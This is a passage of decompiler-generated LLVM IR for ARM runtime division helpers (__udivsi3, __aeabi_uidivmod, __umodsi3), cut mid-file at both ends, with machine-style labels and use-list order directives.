  uselistorder label %dec_label_pc_121b4, { 1, 0 }
  uselistorder label %dec_label_pc_120c8, { 1, 0 }
  uselistorder label %dec_label_pc_120b8.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1209c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12010, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11ee8, { 1, 0 }
  uselistorder label %dec_label_pc_11e74, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_129d4 = add i32 %arg2, -1
  %v7_129d4 = icmp eq i32 %arg2, 1
  br i1 %v7_129d4, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_129d8 = load i32, i32* @r0, align 4
  ret i32 %v2_129d8

bb80:                                             ; preds = %entry
  %v2_129d4 = icmp eq i32 %arg2, 0
  br i1 %v2_129d4, label %dec_label_pc_12abc, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %bb80
  %v0_129e0 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_129e0, %arg2
  br i1 %tmp, label %dec_label_pc_129e8, label %dec_label_pc_12a74

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129e0
  %v2_129e8 = and i32 %v1_129d4, %arg2
  %v4_129e8 = icmp eq i32 %v2_129e8, 0
  br i1 %v4_129e8, label %dec_label_pc_12a80, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129e8
  %v3_129f0 = icmp ult i32 %arg2, 536870912
  br i1 %v3_129f0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_129f0
  %v4_129f4 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_129f0, %.thread
  %v0_12a14.pr36.ph = phi i32 [ %v4_129f4, %.thread ], [ %arg2, %dec_label_pc_129f0 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_129f0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_12a14.pr36 = phi i32 [ %v4_12a08, %bb83 ], [ %v0_12a14.pr36.ph, %.preheader.preheader ]
  %v1_12a0c = phi i32 [ %v4_12a0c, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_12a00 = icmp ugt i32 %v0_12a14.pr36, 268435455
  br i1 %v2_12a00, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12a14thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_12a04 = icmp ult i32 %v0_12a14.pr36, %v0_129e0
  br i1 %v4_12a04, label %bb82, label %dec_label_pc_12a14thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_12a08 = and i32 %v0_12a14.pr36, 268435456
  %v3_12a08 = icmp eq i32 %v2_12a08, 0
  %v4_12a08 = mul i32 %v0_12a14.pr36, 16
  br i1 %v3_12a08, label %bb83, label %dec_label_pc_12a14.loopexit

bb83:                                             ; preds = %bb82
  %v2_12a0c = and i32 %v1_12a0c, 268435456
  %v3_12a0c = icmp eq i32 %v2_12a0c, 0
  %v4_12a0c = mul i32 %v1_12a0c, 16
  br i1 %v3_12a0c, label %.preheader, label %dec_label_pc_12a14thread-pre-split.loopexit.loopexit

dec_label_pc_12a14thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_12a2048.ph = phi i32 [ %v1_12a0c, %bb81 ], [ %v4_12a0c, %bb83 ]
  %v0_12a14.pr38.ph = phi i32 [ %v0_12a14.pr36, %bb81 ], [ %v4_12a08, %bb83 ]
  br label %dec_label_pc_12a14thread-pre-split.loopexit

dec_label_pc_12a14thread-pre-split.loopexit:      ; preds = %dec_label_pc_12a14thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12a2048 = phi i32 [ %v1_12a0c, %.thread2 ], [ %v1_12a2048.ph, %dec_label_pc_12a14thread-pre-split.loopexit.loopexit ]
  %v0_12a14.pr38 = phi i32 [ %v0_12a14.pr36, %.thread2 ], [ %v0_12a14.pr38.ph, %dec_label_pc_12a14thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12a14thread-pre-split

dec_label_pc_12a14thread-pre-split:               ; preds = %dec_label_pc_12a14thread-pre-split.loopexit, %bb85
  %v1_12a2046 = phi i32 [ %v1_12a2048, %dec_label_pc_12a14thread-pre-split.loopexit ], [ %v3_12a20, %bb85 ]
  %v0_12a14.pr = phi i32 [ %v0_12a14.pr38, %dec_label_pc_12a14thread-pre-split.loopexit ], [ %v3_12a1c, %bb85 ]
  br label %dec_label_pc_12a14

dec_label_pc_12a14.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_12a14

dec_label_pc_12a14:                               ; preds = %dec_label_pc_12a14.loopexit, %dec_label_pc_12a14thread-pre-split
  %v1_12a20 = phi i32 [ %v1_12a2046, %dec_label_pc_12a14thread-pre-split ], [ %v1_12a0c, %dec_label_pc_12a14.loopexit ]
  %v1_12a1c = phi i32 [ %v0_12a14.pr, %dec_label_pc_12a14thread-pre-split ], [ %v4_12a08, %dec_label_pc_12a14.loopexit ]
  %v2_12a14 = icmp slt i32 %v1_12a1c, 0
  br i1 %v2_12a14, label %dec_label_pc_12a28, label %bb84

bb84:                                             ; preds = %dec_label_pc_12a14
  %v4_12a18 = icmp ult i32 %v1_12a1c, %v0_129e0
  br i1 %v4_12a18, label %bb85, label %dec_label_pc_12a28

bb85:                                             ; preds = %bb84
  %v3_12a1c = mul i32 %v1_12a1c, 2
  %v2_12a20 = icmp slt i32 %v1_12a20, 0
  %v3_12a20 = mul i32 %v1_12a20, 2
  br i1 %v2_12a20, label %dec_label_pc_12a28, label %dec_label_pc_12a14thread-pre-split

dec_label_pc_12a28:                               ; preds = %bb84, %dec_label_pc_12a14, %bb85
  %v2_12a3459 = phi i32 [ %v3_12a20, %bb85 ], [ %v1_12a20, %bb84 ], [ %v1_12a20, %dec_label_pc_12a14 ]
  %v1_12a2c51 = phi i32 [ %v3_12a1c, %bb85 ], [ %v1_12a1c, %bb84 ], [ %v1_12a1c, %dec_label_pc_12a14 ]
  br label %dec_label_pc_12a2c

dec_label_pc_12a2c:                               ; preds = %.thread11, %dec_label_pc_12a28
  %v1_12a60 = phi i32 [ %v4_12a60, %.thread11 ], [ %v2_12a3459, %dec_label_pc_12a28 ]
  %v1_12a34 = phi i32 [ %v0_12a6c, %.thread11 ], [ 0, %dec_label_pc_12a28 ]
  %v1_12a64 = phi i32 [ %v4_12a64, %.thread11 ], [ %v1_12a2c51, %dec_label_pc_12a28 ]
  %v1_12a30 = phi i32 [ %v0_12a5c, %.thread11 ], [ %v0_129e0, %dec_label_pc_12a28 ]
  %v3_12a2c = icmp ult i32 %v1_12a30, %v1_12a64
  br i1 %v3_12a2c, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_12a2c
  %v3_12a30 = sub i32 %v1_12a30, %v1_12a64
  %v3_12a34 = or i32 %v1_12a34, %v1_12a60
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12a2c, %bb86
  %v1_12a3c = phi i32 [ %v1_12a30, %dec_label_pc_12a2c ], [ %v3_12a30, %bb86 ]
  %v1_12a40 = phi i32 [ %v1_12a34, %dec_label_pc_12a2c ], [ %v3_12a34, %bb86 ]
  %v4_12a38 = udiv i32 %v1_12a64, 2
  %v6_12a38 = icmp ult i32 %v1_12a3c, %v4_12a38
  br i1 %v6_12a38, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_12a3c = urem i32 %v1_12a64, 2
  %v4_12a3c = icmp eq i32 %v3_12a3c, 0
  %v6_12a3c = sub i32 %v1_12a3c, %v4_12a38
  br i1 %v4_12a3c, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12a40 = udiv i32 %v1_12a60, 2
  %v6_12a40 = or i32 %v1_12a40, %v5_12a40
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_12a48 = phi i32 [ %v6_12a3c, %bb87 ], [ %v1_12a3c, %.thread7 ], [ %v6_12a3c, %bb88 ]
  %v1_12a4c = phi i32 [ %v1_12a40, %bb87 ], [ %v1_12a40, %.thread7 ], [ %v6_12a40, %bb88 ]
  %v4_12a44 = udiv i32 %v1_12a64, 4
  %v6_12a44 = icmp ult i32 %v1_12a48, %v4_12a44
  br i1 %v6_12a44, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_12a48 = and i32 %v1_12a64, 2
  %v4_12a48 = icmp eq i32 %v3_12a48, 0
  %v6_12a48 = sub i32 %v1_12a48, %v4_12a44
  br i1 %v4_12a48, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12a4c = udiv i32 %v1_12a60, 4
  %v6_12a4c = or i32 %v1_12a4c, %v5_12a4c
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_12a54 = phi i32 [ %v6_12a48, %bb89 ], [ %v1_12a48, %.thread8 ], [ %v6_12a48, %bb90 ]
  %v1_12a58 = phi i32 [ %v1_12a4c, %bb89 ], [ %v1_12a4c, %.thread8 ], [ %v6_12a4c, %bb90 ]
  %v4_12a50 = udiv i32 %v1_12a64, 8
  %v6_12a50 = icmp ult i32 %v1_12a54, %v4_12a50
  br i1 %v6_12a50, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_12a54 = and i32 %v1_12a64, 4
  %v4_12a54 = icmp eq i32 %v3_12a54, 0
  %v6_12a54 = sub i32 %v1_12a54, %v4_12a50
  br i1 %v4_12a54, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_12a58 = udiv i32 %v1_12a60, 8
  %v6_12a58 = or i32 %v1_12a58, %v5_12a58
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_12a6c = phi i32 [ %v1_12a58, %bb91 ], [ %v1_12a58, %.thread9 ], [ %v6_12a58, %bb92 ]
  %v0_12a5c = phi i32 [ %v6_12a54, %bb91 ], [ %v1_12a54, %.thread9 ], [ %v6_12a54, %bb92 ]
  %v2_12a5c = icmp eq i32 %v0_12a5c, 0
  br i1 %v2_12a5c, label %dec_label_pc_12a6c, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_12a60, 16
  br i1 %tmp140, label %dec_label_pc_12a6c, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_12a60 = udiv i32 %v1_12a60, 16
  %v4_12a64 = udiv i32 %v1_12a64, 16
  br label %dec_label_pc_12a2c

dec_label_pc_12a6c:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_12a6c

dec_label_pc_12a74:                               ; preds = %dec_label_pc_129e0
  %v9_129e0 = icmp eq i32 %v0_129e0, %arg2
  %. = zext i1 %v9_129e0 to i32
  ret i32 %.

dec_label_pc_12a80:                               ; preds = %dec_label_pc_129e8
  %v2_12a80 = icmp ugt i32 %arg2, 65535
  br i1 %v2_12a80, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_12a80
  %v2_12a84 = and i32 %arg2, 32768
  %v3_12a84 = icmp eq i32 %v2_12a84, 0
  %v4_12a84 = udiv i32 %arg2, 65536
  br i1 %v3_12a84, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_12a80
  %v0_12a9065 = phi i32 [ %arg2, %dec_label_pc_12a80 ], [ %v4_12a84, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_12a94 = phi i32 [ %v0_12a9065, %.thread16 ], [ %v4_12a84, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_12a90 = icmp ugt i32 %v1_12a94, 255
  br i1 %v2_12a90, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_12a94 = and i32 %v1_12a94, 128
  %v3_12a94 = icmp eq i32 %v2_12a94, 0
  %v4_12a94 = udiv i32 %v1_12a94, 256
  br i1 %v3_12a94, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12a98 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_12aa4 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_12a98, %bb100 ]
  %v1_12aa0 = phi i32 [ %v1_12a94, %bb98 ], [ %v4_12a94, %bb99 ], [ %v4_12a94, %bb100 ]
  %v2_12a9c = icmp ugt i32 %v1_12aa0, 15
  br i1 %v2_12a9c, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_12aa0 = and i32 %v1_12aa0, 8
  %v3_12aa0 = icmp eq i32 %v2_12aa0, 0
  %v4_12aa0 = udiv i32 %v1_12aa0, 16
  br i1 %v3_12aa0, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_12aa4 = add nsw i32 %v1_12aa4, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_12aac = phi i32 [ %v1_12aa4, %.thread17 ], [ %v1_12aa4, %bb101 ], [ %v2_12aa4, %bb102 ]
  %v5_12ab0 = phi i32 [ %v1_12aa0, %.thread17 ], [ %v4_12aa0, %bb101 ], [ %v4_12aa0, %bb102 ]
  %v2_12aa8 = icmp ugt i32 %v5_12ab0, 3
  %v7_12aa8 = icmp eq i32 %v5_12ab0, 4
  %v2_12aac = xor i1 %v7_12aa8, true
  %v3_12aac = and i1 %v2_12aa8, %v2_12aac
  br i1 %v3_12aac, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_12aac = add nsw i32 %v4_12aac, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_12ab0 = phi i32 [ %v4_12aac, %.thread18 ], [ %v5_12aac, %bb103 ]
  %v2_12ab0 = xor i1 %v2_12aa8, true
  %v3_12ab0 = or i1 %v7_12aa8, %v2_12ab0
  br i1 %v3_12ab0, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_12ab0 = udiv i32 %v5_12ab0, 2
  %v9_12ab0 = add i32 %v4_12ab0, %v8_12ab0
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_12ab4 = phi i32 [ %v4_12ab0, %bb104 ], [ %v9_12ab0, %bb105 ]
  %v6_12ab4 = lshr i32 %v0_129e0, %v1_12ab4
  ret i32 %v6_12ab4

dec_label_pc_12abc:                               ; preds = %bb80
  %v0_12abc = load i32, i32* @lr, align 4
  %v0_12ac0 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12abc)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12ab0, { 1, 0 }
  uselistorder i1 %v7_12aa8, { 1, 0 }
  uselistorder i32 %v4_12aa0, { 1, 0 }
  uselistorder i32 %v1_12aa0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12a94, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12a94, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12a84, { 1, 0 }
  uselistorder i32 %v0_12a5c, { 1, 0 }
  uselistorder i32 %v4_12a50, { 1, 0 }
  uselistorder i32 %v1_12a58, { 1, 2, 0 }
  uselistorder i32 %v4_12a44, { 1, 0 }
  uselistorder i32 %v1_12a4c, { 1, 2, 0 }
  uselistorder i32 %v4_12a38, { 1, 0 }
  uselistorder i32 %v1_12a40, { 1, 2, 0 }
  uselistorder i32 %v1_12a64, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12a34, { 1, 0 }
  uselistorder i32 %v1_12a60, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12a20, { 1, 0 }
  uselistorder i32 %v3_12a1c, { 1, 0 }
  uselistorder i32 %v1_12a1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12a20, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12a0c, { 1, 0 }
  uselistorder i32 %v4_12a08, { 2, 1, 0 }
  uselistorder i32 %v1_12a0c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12a14.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_129e0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_12a6c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12a28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12a14thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12ad0 = udiv i32 %arg1, %arg2
  ret i32 %v2_12ad0
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_12ae4 = add i32 %arg2, -1
  %v2_12ae4 = icmp eq i32 %arg2, 0
  br i1 %v2_12ae4, label %dec_label_pc_12ba0, label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %entry
  %v7_12ae4 = icmp eq i32 %arg2, 1
  br i1 %v7_12ae4, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_12aec
  %v1_12aec = load i32, i32* @r0, align 4
  %v10_12aec = icmp eq i32 %v1_12aec, %arg2
  br i1 %v10_12aec, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_12aec, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_12aec = icmp ult i32 %v1_12aec, %arg2
  br i1 %v4_12aec, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_12af4 = and i32 %v1_12ae4, %arg2
  %v8_12af4 = icmp eq i32 %v6_12af4, 0
  br i1 %v8_12af4, label %.thread67, label %dec_label_pc_12b04.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_12af8 = phi i32 [ %v1_12aec, %bb75 ], [ 0, %.thread65 ]
  %v3_12af8 = and i32 %v1_12af8, %v1_12ae4
  br label %bb76

dec_label_pc_12b04.preheader:                     ; preds = %bb75
  %v2_12b0499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_12b0499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_12b94, %bb74, %bb89, %bb84, %dec_label_pc_12b64, %.thread67
  %v5_12afc = phi i32 [ %v1_12aec, %bb74 ], [ %v3_12af8, %.thread67 ], [ %v1_12b40.v6_12b40.v6_12b48.v6_12b50, %dec_label_pc_12b64 ], [ 0, %bb84 ], [ %v1_12b98, %dec_label_pc_12b94 ], [ %v2_12b94, %bb89 ]
  ret i32 %v5_12afc

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_12b04.preheader
  %v0_12b18.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_12b04.preheader ], [ %v4_12b0c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12b04.preheader ], [ %v2_12b1011, %.thread1.thread9 ]
  br label %dec_label_pc_12b18thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_12b04.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_12b1011, %.thread1.thread9 ], [ 0, %dec_label_pc_12b04.preheader ]
  %v0_12b18.pr33100 = phi i32 [ %v4_12b0c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_12b04.preheader ]
  %v4_12b08 = icmp ult i32 %v0_12b18.pr33100, %v1_12aec
  br i1 %v4_12b08, label %bb78, label %dec_label_pc_12b18thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_12b0c = and i32 %v0_12b18.pr33100, 268435456
  %v3_12b0c = icmp eq i32 %v2_12b0c, 0
  %v4_12b0c = mul i32 %v0_12b18.pr33100, 16
  br i1 %v3_12b0c, label %.thread1.thread9, label %dec_label_pc_12b18.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_12b1011 = add i32 %storemerge101, 4
  %v2_12b04 = icmp ugt i32 %v4_12b0c, 268435455
  br i1 %v2_12b04, label %.thread, label %bb77

dec_label_pc_12b18thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_12b18thread-pre-split.loopexit

dec_label_pc_12b18thread-pre-split.loopexit:      ; preds = %dec_label_pc_12b18thread-pre-split.loopexit.loopexit, %.thread
  %v0_12b18.pr3398 = phi i32 [ %v0_12b18.pr33.lcssa, %.thread ], [ %v0_12b18.pr33100, %dec_label_pc_12b18thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_12b18thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12b18thread-pre-split

dec_label_pc_12b18thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12b18thread-pre-split.loopexit
  %v1_12b2439 = phi i32 [ %storemerge95, %dec_label_pc_12b18thread-pre-split.loopexit ], [ %v2_12b24, %.thread4 ]
  %v0_12b18.pr = phi i32 [ %v0_12b18.pr3398, %dec_label_pc_12b18thread-pre-split.loopexit ], [ %v3_12b20, %.thread4 ]
  br label %dec_label_pc_12b18

dec_label_pc_12b18.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12b18.loopexit, %dec_label_pc_12b18thread-pre-split
  %v0_12b2c.pr = phi i32 [ %v1_12b2439, %dec_label_pc_12b18thread-pre-split ], [ %storemerge101, %dec_label_pc_12b18.loopexit ]
  %v1_12b20 = phi i32 [ %v0_12b18.pr, %dec_label_pc_12b18thread-pre-split ], [ %v4_12b0c, %dec_label_pc_12b18.loopexit ]
  %v2_12b18 = icmp slt i32 %v1_12b20, 0
  br i1 %v2_12b18, label %dec_label_pc_12b2c, label %bb79

bb79:                                             ; preds = %dec_label_pc_12b18
  %v4_12b1c = icmp ult i32 %v1_12b20, %v1_12aec
  br i1 %v4_12b1c, label %.thread4, label %dec_label_pc_12b2c

.thread4:                                         ; preds = %bb79
  %v3_12b20 = mul i32 %v1_12b20, 2
  %v2_12b24 = add i32 %v0_12b2c.pr, 1
  br label %dec_label_pc_12b18thread-pre-split

dec_label_pc_12b2c:                               ; preds = %bb79, %dec_label_pc_12b18
  %v2_12b2c = add i32 %v0_12b2c.pr, -3
  %v5_12b30 = icmp slt i32 %v0_12b2c.pr, 3
  br i1 %v5_12b30, label %dec_label_pc_12b70, label %dec_label_pc_12b34

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12b2c, %bb83
  %v6_12b5c = phi i32 [ %v0_12b64, %bb83 ], [ %v2_12b2c, %dec_label_pc_12b2c ]
  %v1_12b38 = phi i32 [ %v1_12b40.v6_12b40.v6_12b48.v6_12b50, %bb83 ], [ %v1_12aec, %dec_label_pc_12b2c ]
  %v3_12b5812 = phi i32 [ %v3_12b58, %bb83 ], [ %v1_12b20, %dec_label_pc_12b2c ]
  %v3_12b34 = icmp ult i32 %v1_12b38, %v3_12b5812
  %v3_12b38 = select i1 %v3_12b34, i32 0, i32 %v3_12b5812
  %v1_12b40 = sub i32 %v1_12b38, %v3_12b38
  %v4_12b3c = udiv i32 %v3_12b5812, 2
  %v6_12b3c = icmp ult i32 %v1_12b40, %v4_12b3c
  %v6_12b40 = select i1 %v6_12b3c, i32 0, i32 %v4_12b3c
  %v1_12b40.v6_12b40 = sub i32 %v1_12b40, %v6_12b40
  %.demorgan = and i1 %v3_12b34, %v6_12b3c
  %v4_12b44 = udiv i32 %v3_12b5812, 4
  %v6_12b44 = icmp ult i32 %v1_12b40.v6_12b40, %v4_12b44
  %v6_12b48 = select i1 %v6_12b44, i32 0, i32 %v4_12b44
  %v1_12b40.v6_12b40.v6_12b48 = sub i32 %v1_12b40.v6_12b40, %v6_12b48
  %.demorgan71 = and i1 %.demorgan, %v6_12b44
  %v4_12b4c = udiv i32 %v3_12b5812, 8
  %v6_12b4c = icmp ult i32 %v1_12b40.v6_12b40.v6_12b48, %v4_12b4c
  %v6_12b50 = select i1 %v6_12b4c, i32 0, i32 %v4_12b4c
  %v1_12b40.v6_12b40.v6_12b48.v6_12b50 = sub i32 %v1_12b40.v6_12b40.v6_12b48, %v6_12b50
  %.demorgan72 = and i1 %.demorgan71, %v6_12b4c
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_12b34
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_12b34, %bb80
  %v2_12b54 = add i32 %v1_12b40.v6_12b40.v6_12b48.v6_12b50, -1
  %v4_12b54 = sub i32 0, %v1_12b40.v6_12b40.v6_12b48.v6_12b50
  %v5_12b54 = and i32 %v1_12b40.v6_12b40.v6_12b48.v6_12b50, %v4_12b54
  %v3_12b58 = udiv i32 %v3_12b5812, 16
  %v5_12b5c = icmp slt i32 %v1_12b40.v6_12b40.v6_12b48.v6_12b50, 1
  br i1 %v5_12b5c, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_12b5c = add i32 %v6_12b5c, -4
  %v9_12b5c = sub i32 3, %v6_12b5c
  %v10_12b5c = and i32 %v9_12b5c, %v6_12b5c
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_12b64 = phi i32 [ %v6_12b5c, %bb81 ], [ %v7_12b5c, %bb82 ]
  %v0_12b6015.in = phi i32 [ %v2_12b54, %bb81 ], [ %v7_12b5c, %bb82 ]
  %v1_12b6014.in = phi i32 [ %v5_12b54, %bb81 ], [ %v10_12b5c, %bb82 ]
  %v1_12b6014 = icmp slt i32 %v1_12b6014.in, 0
  %v0_12b6015 = icmp slt i32 %v0_12b6015.in, 0
  %v2_12b60 = xor i1 %v0_12b6015, %v1_12b6014
  br i1 %v2_12b60, label %dec_label_pc_12b64, label %dec_label_pc_12b34

dec_label_pc_12b64:                               ; preds = %bb83
  %v1_12b64 = urem i32 %v0_12b64, 4
  %v2_12b64 = icmp eq i32 %v1_12b64, 0
  br i1 %v2_12b64, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_12b64
  %v3_12b68 = icmp eq i32 %v1_12b40.v6_12b40.v6_12b48.v6_12b50, 0
  br i1 %v3_12b68, label %bb76, label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %bb84, %dec_label_pc_12b2c
  %v0_12b84 = phi i32 [ %v3_12b58, %bb84 ], [ %v1_12b20, %dec_label_pc_12b2c ]
  %v1_12b80 = phi i32 [ %v1_12b40.v6_12b40.v6_12b48.v6_12b50, %bb84 ], [ %v1_12aec, %dec_label_pc_12b2c ]
  %v0_12b70 = phi i32 [ %v0_12b64, %bb84 ], [ %v2_12b2c, %dec_label_pc_12b2c ]
  %v5_12b74 = icmp slt i32 %v0_12b70, -2
  br i1 %v5_12b74, label %dec_label_pc_12b94, label %dec_label_pc_12b78

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b70
  %v8_12b70 = icmp eq i32 %v0_12b70, -2
  br i1 %v8_12b70, label %dec_label_pc_12b88, label %dec_label_pc_12b7c

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12b78
  %v3_12b7c = icmp ult i32 %v1_12b80, %v0_12b84
  br i1 %v3_12b7c, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_12b7c
  %v2_12b7c = sub i32 %v1_12b80, %v0_12b84
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12b7c, %bb85
  %v0_12b8852 = phi i32 [ %v1_12b80, %dec_label_pc_12b7c ], [ %v2_12b7c, %bb85 ]
  %v3_12b84 = udiv i32 %v0_12b84, 2
  br label %dec_label_pc_12b88

dec_label_pc_12b88:                               ; preds = %dec_label_pc_12b78, %bb86
  %v0_12b90 = phi i32 [ %v0_12b84, %dec_label_pc_12b78 ], [ %v3_12b84, %bb86 ]
  %v1_12b8c = phi i32 [ %v1_12b80, %dec_label_pc_12b78 ], [ %v0_12b8852, %bb86 ]
  %v3_12b88 = icmp ult i32 %v1_12b8c, %v0_12b90
  br i1 %v3_12b88, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_12b88
  %v2_12b88 = sub i32 %v1_12b8c, %v0_12b90
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_12b88, %bb87
  %v0_12b9455 = phi i32 [ %v1_12b8c, %dec_label_pc_12b88 ], [ %v2_12b88, %bb87 ]
  %v3_12b90 = udiv i32 %v0_12b90, 2
  br label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b70, %bb88
  %v2_12b98 = phi i32 [ %v0_12b84, %dec_label_pc_12b70 ], [ %v3_12b90, %bb88 ]
  %v1_12b98 = phi i32 [ %v1_12b80, %dec_label_pc_12b70 ], [ %v0_12b9455, %bb88 ]
  %v3_12b94 = icmp ult i32 %v1_12b98, %v2_12b98
  br i1 %v3_12b94, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_12b94
  %v2_12b94 = sub i32 %v1_12b98, %v2_12b98
  br label %bb76

dec_label_pc_12ba0:                               ; preds = %entry
  %v0_12ba0 = load i32, i32* @lr, align 4
